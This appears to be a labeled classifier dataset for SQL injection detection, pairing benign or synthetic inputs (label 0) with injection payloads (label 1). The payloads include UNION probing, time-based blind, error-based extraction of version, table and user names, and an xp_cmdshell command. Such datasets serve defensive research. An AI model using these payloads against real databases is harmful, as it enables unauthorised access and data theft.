"-4670""   )    )    or 3038  =  3038";1
SELECT COUNT ( result ) FROM gentle;0
select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1';1
pasaje magistrado salvador barbera 136,;0
1*56;1
SELECT COUNT ( height ) FROM studying;0
SELECT AVG ( muscle ) FROM dangerous;0
1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  ';1
SELECT * FROM arm WHERE canal = 'wagon' FETCH FIRST 3 ROWS ONLY;0
1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
6,80E+13;0
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --";1
SELECT * FROM master WHERE sang BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT volume ( s ) FROM girl INNER JOIN;0
SELECT column_name ( s )  FROM difference,minute;0
or 'something'   =   'some'+'thing';1
SELECT * FROM hole WHERE son = 'wish';0
1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||';1
24152;0
or 2 between 1 and 3;1
getulio;0
SELECT AVG ( hurry ) FROM name SELECT SUM ( phrase ) ;0
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1";1
1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT TOP 3 * FROM instant;0
select * from users where id  =  1 or @`` union select 1,version  (    )   -- 1;1
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1";1
SELECT * FROM place;0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""  =  ""hjxh";1
"1"" union all select null,null,null,null,null,null,null,null,null#";1
"DELETE FROM users WHERE description = 'john@example.com';";0
1364;0
1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf;1
DELETE FROM label;0
SELECT * FROM story WHERE table BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT TOP 3 * FROM percent WHERE satisfied = 'pack' SELECT * FROM hill;0
ORDER BY 9#;1
hallaran@manjarr.cd;0
SELECT vegetable ( s )  FROM solar LEFT JOIN;0
UNION ALL SELECT;1
cangrenarse;0
SELECT kept ( s )  FROM old SELECT actual ( s ) ;0
33418;0
-1479%' or 5201  =  3398--;1
"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """;1
SELECT border;0
81e9604o6o;0
1'||  (  select 'ozki' where 4435  =  4435   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||';1
"UPDATE logs SET price = 'pending' WHERE description = 'pending';";0
"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --";1
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc";1
ORDER BY 14;1
SELECT * FROM hospital WHERE girl IN  ( 'however', 'most', 'milk' )  ;0
"-6848""   )    )    or 4071  =  5312";1
de78e24423n6e;0
SELECT AVG ( mix ) FROM write SELECT SUM ( harder ) ;0
-4045 union all select 6857,6857,6857,6857,6857,6857,6857--;1
"SELECT name FROM logs WHERE created_at = 'active';";0
travesia uruguay, 172,;0
1'  )   where 9817  =  9817;1
SELECT AVG ( Price ) FROM kind;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#;1
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc";1
"1"" where 9973  =  9973 and 2006  =  2006";1
select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1';1
"SELECT id, created_at, description, price FROM products WHERE name = 'user123';";0
SELECT * FROM open WHERE throughout = 'fought'  AND City = 'me';0
-2375 union all select 1573,1573,1573,1573#;1
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--;1
SELECT Employees.trace, COUNT ( Orders.happyID )  AS loseFROM    ( OrdersINNER JOIN control ON Orders.lookID  =  Employees.noddedID ) ;0
SELECT AVG ( rest ) FROM toy SELECT SUM ( be ) ;0
2,97E+15;0
mannkopf.gray@ajuntamentbcn2-0.il;0
1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #;1
SELECT * FROM common ORDER BY should DESC;0
t'exec master..xp_cmdshell 'nslookup www.google.com'--;1
SELECT * FROM private WHERE mental IN  ( SELECT thousand FROM silence ) ;0
SELECT * FROM future WHERE NOT stream = 'replace'  AND NOT call = 'pay';0
"DELETE FROM users WHERE created_at = 456;";0
DELETE FROM window WHERE gas = 'tube';0
-7442  )   or 3391  =  7492;1
SELECT * FROM likely WHERE equally = 'is';0
INSERT INTO with ( leaf, trip, today, life, view, afraid )  VALUES  ( 'been', 'round'. suit', 'replied', 'year', 'help', 'save' )  ;0
SELECT * FROM structure ORDER BY elephant, able;0
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """;1
"INSERT INTO customers (id, user_id, created_at, price) VALUES ('2023-01-01', 'user123', 'user123', 'pending');";0
1'+  (  select trte where 9173  =  9173 and 2006  =  2006;1
select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i;1
SELECT * FROM only WHERE    NOT acres = 'whale';0
-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#;1
"""-""";1
1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ;1
SELECT * FROM fast WHERE up = 'simply';0
armintario;0
SELECT COUNT ( dull ) , careful FROM fort BY generally;0
SELECT stuck, however, horse FROM church WHERE deep  IS NULL;0
"DELETE FROM sessions WHERE name = 'Sample text';";0
"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--";1
1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --;1
1'   )    )    union all select null,null,null,null,null,null,null,null,null--;1
SELECT soap, home, distance FROM may WHERE saved  IS NULL;0
SELECT fed,kill FROM flew WHERE wing = 'pile' UNION SELECT larger, fireplace FROM dry;0
1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i;1
"INSERT INTO users (user_id, email, price, status) VALUES ('Sample text', 'pending', 'pending', 'pending');";0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh;1
1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --;1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ";1
SELECT fifth,split,stream FROM member LEFT JOIN Orders ON together.additionalID =  sad.small ORDER BY copy.gray;0
SELECT Count ( * )  AS toward;0
SELECT wash ( s )  FROM aloud UNION ALL;0
SELECT COUNT ( pot )  FROM be;0
SELECT COUNT ( divideID ) FROM asleep;0
-5066'   )    )    union all select 9689,9689,9689,9689#;1
"UPDATE customers SET price = '2023-01-01' WHERE email = '2023-01-01';";0
1  )   as estm where 4809  =  4809 union all select null,null,null--;1
1  )   as cjmt where 4839  =  4839 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --;1
SELECT setting ( s ) FROM what INNER JOIN;0
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --";1
"INSERT INTO employees (email, user_id) VALUES ('Sample text', 'Sample text');";0
or a  =  a;1
SELECT * FROM read WHERE breathe = 'thus' FETCH FIRST 3 ROWS ONLY;0
INSERT INTO total  ( replied, job, settlers )  VALUES  ( 'fastened', 'scale', 'pond' )  ;0
SELECT * FROM happy WHERE road = 'operation' LIMIT 3;0
de las muecas pedrol;0
SELECT * FROM salmon WHERE NOT sent = 'bare'  AND NOT saved = 'tin';0
1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +';1
AS INJECTX WHERE 1=1 AND 1=1--;1
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --";1
garantir;0
"1""  )   as saqy where 9704  =  9704   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --";1
flavio;0
INSERT INTO chief  ( horse, family, needed )  VALUES  ( 'hall', 'outer', 'master' )  ;0
select sleep  (  5  )   and 'gajm'  =  'gajm;1
1'+  (  select ankx where 6789  =  6789;1
-5379'  )   union all select 4294,4294,4294--;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'));1
SELECT * FROM flag WHERE thrown = 'hour'  AND  ( heart = 'spell' OR open = 'massage' ) ;0
nebila;0
SELECT * FROM second WHERE star = 'island'  OR river = 'beside';0
SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card;0
SELECT they,right,matter FROM therefore LEFT JOIN Orders ON positive.deadID =  shape.standard ORDER BY naturally.or;0
SELECT * FROM air WHERE practical NOT LIKE '[machine]%';0
1  )   where 2543  =  2543;1
c/ era val d'aran s/n, 7?e;0
1'   )    )     )   union all select null,null,null,null#;1
9491;0
SELECT opposite FROM various;0
estupian lladonet;0
"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
"DELETE FROM orders WHERE email = 123;";0
SELECT MIN ( wish )  AS wolf FROM ear;0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847;1
21;0
SELECT those ( s )  FROM drawn SELECT wrong ( s ) ;0
SELECT trap,chosen,eventually,journey,job     (  (  build JOIN grandmother ON satisfied.salt =  studied.eventually )   INNER JOIN perfectON Orders.coast =  whom.gentleID ) ;0
wickens@cpanelhost.com.ht;0
SELECT AVG ( Price ) FROM further;0
"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--";1
-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#;1
SELECT * FROM anywhere WHERE hurt = 'under' FETCH FIRST 3 ROWS ONLY;0
"SELECT name FROM products WHERE quantity = 'Sample text';";0
SELECT AVG ( prize )  FROM bad  SELECT SUM ( quarter ) ;0
zemanek;0
triantap;0
"INSERT INTO users (created_at, user_id, email, name) VALUES (123, 'Sample text', 123, 'pending');";0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ) ;0
1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf;1
SELECT pencil, mighty+ ', ' + sudden+ ' ' + might+ ', ' + tape AS during  FROM him;0
SELECT * FROM outside WHERE nervous IN  ( 'aware', 'cut', 'all' )  ;0
t'exec master..xp_cmdshell 'nslookup www.googl ...;1
SELECT * FROM native WHERE couple = 'hard';0
SELECT * FROM repeat WHERE your = 'medicine';0
begin dbms_lock.sleep  (  5  ) ;1
"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --";1
"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#";1
calle cortafell, 74;0
SELECT * FROM thee 3 SELECT * FROM molecular;0
SELECT * FROM camera FETCH FIRST 50 PERCENT ROWS ONLY;0
alcoleja;0
spano-macary@biosaludsystems.ml;0
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm";1
SELECT * FROM frozen ORDER BY over, former;0
1 or sleep  (  5  )  # tdgb;1
21392437e;0
SELECT * FROM prize WHERE west = 'source'  OR usually = 'riding';0
491vi06a5;0
select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1;1
SELECT * FROM thy FETCH FIRST 50 PERCENT ROWS ONLY;0
select sleep  (  5  )   and    (    (     (  5552  =  5552;1
""" or """"^""";1
refriega;0
SELECT they,right,matter FROM therefore LEFT JOIN Orders ON positive.deadID =  shape.standard ORDER BY naturally.or;0
waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf;1
"UPDATE users SET description = 'pending' WHERE name = 456;";0
SELECT vegetable ( s )  FROM solar LEFT JOIN;0
"INSERT INTO employees (created_at, user_id) VALUES (123, 123);";0
36823414t;0
"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx";1
SELECT separate,this FROM gone WHERE island = 'zero' UNION SELECT promised, block FROM disappear;0
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye";1
SELECT * FROM recently 3 SELECT * FROM excellent;0
1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #;1
SELECT * FROM tonight WHERE potatoes = 'ride'  AND  ( shadow = 'play' OR cage = 'toward' ) ;0
SELECT AVG ( relationship ) FROM fox;0
"admin"" or 1  =  1--";1
fasti-dio;0
-2734'  )   union all select 5510,5510,5510,5510,5510#;1
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason;0
22468230j;0
SELECT AVG ( public ) FROM gasoline;0
ORDER BY 1,SLEEP(5)#;1
-5555   )    )    as ldte where 4583  =  4583 order by 1#;1
SELECT * FROM several WHERE instance NOT BETWEEN 'lay' AND 'ran';0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--;1
"INSERT INTO orders (status, name, id, price) VALUES (456, 'john@example.com', 'user123', 'pending');";0
ORDER BY 1--;1
SELECT copper ( s )  FROM day SELECT layers FROM success;0
SELECT Employees.lot, COUNT ( Orders.industryID )  AS talesFROM    ( OrdersINNER JOIN must ON Orders.equipmentID  =  Employees.stiffID ) ;0
1 or sleep(5)#;1
SELECT * FROM living;0
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse";1
SELECT * FROM press;0
SELECT COUNT ( eightID ) FROM sick;0
"SELECT description, created_at, user_id FROM products WHERE description = 123;";0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#;1
"SELECT user_id, status, description FROM inventory WHERE quantity = 'john@example.com';";0
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'mgfd'  =  'mgfd;1
SELECT shout ( s )  FROM standard SELECT toward FROM habit;0
"DELETE FROM logs WHERE id = 123;";0
SELECT zero FROM write UNION ALL SELECT future FROM police ORDER BY aid;0
6,34E+15;0
SELECT * FROM people WHERE desk LIKE '%laid%';0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--;1
SELECT * FROM setting WHERE struck IN  ( 'drink', 'giving', 'temperature' )  ;0
"INSERT INTO logs (created_at, quantity, user_id) VALUES ('2023-01-01', 123, 'user123');";0
ORDER BY 2#;1
SELECT * FROM addition FETCH FIRST 3 ROWS ONLY;0
1 and 7533  =  7533-- spzi;1
84881293t;0
"-7409""   )    )    union all select 3145,3145,3145--";1
1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul;1
select * from users where id  =  1 union select @&&@,version  (    )   -- 1;1
1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--;1
"1""   )    )    as qrrx where 4633  =  4633 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX';1
"1""  )   where 6311  =  6311";1
SELECT * FROM born 3 SELECT * FROM us;0
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #";1
1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT boy ( s )  FROM card SELECT carry ( s ) ;0
"select sleep  (  5  )   and    (    (     (  ""%""  =  """;1
SELECT DISTINCT cage FROM relationship;0
like;1
1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'jmjw' like 'jmjw;1
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """;1
SELECT AVG ( similar ) FROM most;0
"1""  )   where 4567  =  4567 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
UPDATE vapor SET alone = 'how'WHERE gate = 'acres';0
46160431y;0
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ;1
SELECT * FROM spent WHERE least = 'active' LIMIT 3;0
%27 or 1  =  1;1
"UPDATE employees SET name = 123 WHERE id = 'Sample text';";0
select * from users where id  =  1 +$+ or 1  =  1 -- 1;1
"UPDATE sessions SET price = '2023-01-01' WHERE quantity = 'Sample text';";0
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu";1
1'||  (  select 'brsr' where 5458  =  5458;1
-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  8752  =  8752;1
SELECT COUNT ( table ) FROM location;0
-9541 where 4291  =  4291 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --;1
1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly;1
540;0
select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1;1
dearly@evelin.ge;0
"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""ypoj""  =  ""ypoj";1
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ;0
SELECT * FROM note 3;0
SELECT * FROM rush FETCH FIRST 50 PERCENT ROWS ONLY;0
furnari pentinat;0
OR 1=1#;1
1'||  (  select 'goen' from dual where 8586  =  8586;1
SELECT * FROM way WHERE vertical NOT LIKE 'member%';0
"INSERT INTO customers (user_id, quantity, name) VALUES ('Sample text', 123, 456);";0
UNION ALL SELECT 1#;1
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear;0
"DELETE FROM inventory WHERE user_id = 'Sample text';";0
-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
"admin"") or ""1""=""1";1
SELECT test ( s )  FROM means LEFT JOIN;0
SELECT * FROM soldier ORDER BY government ASC, chamber DESC;0
1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
SELECT * FROM ball WHERE bar = 'nearly'  OR whatever = 'advice';0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""%""  =  """;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--;1
"1""   )    )     )   union all select null,null,null,null#";1
plaa verdum 144,;0
SELECT married, dug, zeroFROM work WHERE dollar  IS NOT NULL;0
sikes-jeans@923.mv;0
1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
or 1  =  1;1
select pg_sleep  (  5  )   and   (  'itgc'  =  'itgc;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i;1
SELECT * FROM shoulder WHERE NOT minute = 'appropriate'  AND NOT among = 'win';0
SELECT * FROM butter WHERE complete = 'produce' LIMIT 3;0
SELECT * FROM throat ORDER BY cake DESC;0
"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--";1
-1277'   )    )     )   order by 1--;1
"DELETE FROM products WHERE created_at = 'user123';";0
FROM  ( SELECT DISTINCT live FROM mainly ) ;0
1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp;1
"admin"" #";1
or 0  =  0 #;1
1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
9ar5i04o;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#;1
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ";1
SELECT * FROM  ( SELECT black FROM of ) ;0
SELECT fire ( s )  FROM see FULL OUTER JOIN;0
SELECT DISTINCT history FROM history;0
SELECT * FROM heard;0
"""-""";1
SELECT quite ( s )  FROM tip UNION;0
arnaldo;0
1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT * FROM should WHERE rear = 'divide';0
1   )    )    as syot where 1199  =  1199;1
"SELECT id, created_at, description, price FROM products WHERE name = 'user123';";0
"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--";1
SELECT * FROM path WHERE Price NOT BETWEEN 10 AND 20;0
1' and sleep  (  5  )  #;1
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ;0
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
"DELETE FROM inventory WHERE id = '2023-01-01';";0
select * from users where id  =  1 +   (  +  )   or 1  =  1 -- 1;1
"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw";1
"INSERT INTO inventory (quantity, status) VALUES ('john@example.com', 'Sample text');";0
